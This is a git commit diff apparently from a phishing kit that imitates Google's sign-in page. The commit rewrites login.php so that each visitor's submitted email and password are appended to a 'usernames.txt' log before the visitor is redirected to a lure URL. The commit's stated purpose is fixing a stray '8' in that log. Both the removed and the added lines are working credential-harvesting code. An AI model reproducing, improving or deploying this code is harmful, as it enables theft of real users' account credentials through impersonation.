61cba860fc3b7bee8c1b3e17413602897f42c87b
Usama Abdul Sattar <usama123456789@protonmail.com>
2019-06-15 09:17:31 +0500

    fix #176
    Fix "8" gets printed at the end

--- WebPages/google_standard/login.php
+++ WebPages/google_standard/login.php
@@ -4,15 +4,9 @@ include 'ip.php';
 			
 			$pass = $_POST["password"];
 			$email=$_SESSION["Email"];
-			//opening logins text file for appending new data.
-  			$file = fopen("usernames.txt", "a") or die("Unable to open file!");
 			
-  			//Writing email and password to logins.txt. 
-  			fwrite($file, "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass .FILE_APPEND);			
-  			fclose($file);//closing logins.txt.
-			
-  			//redirecting user to the google drive's locations where the game is available to download.
-  			//change the location url to redirect to a website of your choice.
+  			
+  			file_put_contents("usernames.txt", "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass . "\n", FILE_APPEND);
   			header('Location: <CUSTOM>');
 			exit();
 			
